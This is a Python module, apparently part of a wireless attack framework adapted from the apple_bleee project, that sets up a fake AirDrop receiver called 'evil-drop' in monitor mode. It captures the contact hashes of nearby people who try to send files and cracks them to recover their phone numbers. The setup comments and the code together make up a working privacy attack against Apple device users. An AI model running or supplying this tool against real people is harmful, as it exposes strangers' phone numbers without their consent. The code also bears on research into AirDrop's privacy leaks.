# Adapting script from https://github.com/hexway/apple_bleee
# Thanks to Dmitry Chastuhin @_chipik and https://hexway.io 
# Author: @lucferbux
from modules._module import Module
from utils.custom_print import print_info, print_ok, print_error, print_body
from utils.check_root import is_root
from utildata.dataset_options import Option
from utils.ble_apple.wireless_interface import BadInterfaceException, ModeMonitorException, OwlException, check_wifi_config
import time
import hashlib
from threading import Thread, Timer
from utils.opendrop.base import AirDropBase
from utils.hash_validator import check_hash

class HomeModule(Module):

    def __init__(self):
        information = {"Name": "Aidrop Leak",
                       "Description": "This script allows to get mobile phone number of any user who will try to send file via AirDrop",
                       "privileges": "root",
                       "OS": "Linux",
                       "Reference" : "https://github.com/hexway/apple_bleee",
                       "Author": "@lucferbux"}

        options = {
            "iface": Option.create(name="iface", value="wlan0", description="Wireless Interface to enable monitor mode")
        }

        self.results = {}
        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    # 1. Install owl git clone https://github.com/seemoo-lab/owl.git && cd ./owl && git submodule update --init && mkdir build && cd build && cmake .. && make && sudo make install && cd ../..
    # 2. sudo rfkill list all
    # 3. sudo ifconfig [wlan] down
    # 4. sudo iwconfig [wlan] mode monitor
    # 5. sudo ifconfig [wlan] up
    # 6. ip link set wlan0 up
    # 7. owl -i [wlan] -N -D
    # 8. if error kill owl -- sudo kill $(sudo ps -A | grep owl | awk '{print $1}') 
    @is_root
    def run(self):
        iface = str(self.args.get("iface", "wlan0"))
        
        try:
            print("Configuring owl interface...")
            check_wifi_config(iface)
            time.sleep(5) # time to wake up owl process
        except ModeMonitorException:
            print("Error, mode monitor not suported in the given interface, press ctr+c to continue")
            return
        except BadInterfaceException:
            print("Error, inteface not found, press ctr+c to continue")
            return
        except OwlException:
            print("Error, there was a problem setting up owl, press ctr+c to continue, if not insalled --> https://github.com/seemoo-lab/owl.git")
            return
        except Exception as e:
            print(f"Error, something went wrong configuring the interface, press ctr+c to continue --> {e}")
            return
        
        try:
            self.start_listetninig()
        except:
            print("")
            print("Bye")

    def get_people(self):
        return self.results

    def start_listetninig(self, name="evil-drop", email="evilmail@gmail.com", phone="34666666666"):
        print("[*] Looking for AirDrop senders...")
        AirDropBase("receive", name=name, callback=self.process_devices, email=email, phone=phone)

    def get_hash(self, data):
        return hashlib.sha256(data.encode('utf-8')).hexdigest()

    def process_devices(self, device):
        hash = device.get("hash", None)
        hash = hash.replace("\\x04)", "")
        hash = hash.replace("\\x00)", "")
        if(hash not in self.results.keys()):
            self.results.update({hash : {}}) 
            print("found one...")
            try:                       
                phone = check_hash(hash)
            except Exception as e:
                print(e)
                phone = "None"
            if(phone != "None"):
                print(f"Someone with phone number {phone} and hash {hash} has tried to use AirDrop")
                print(self.results)
            else:
                print(f"Someone with hash {hash} has tried to use AirDrop")

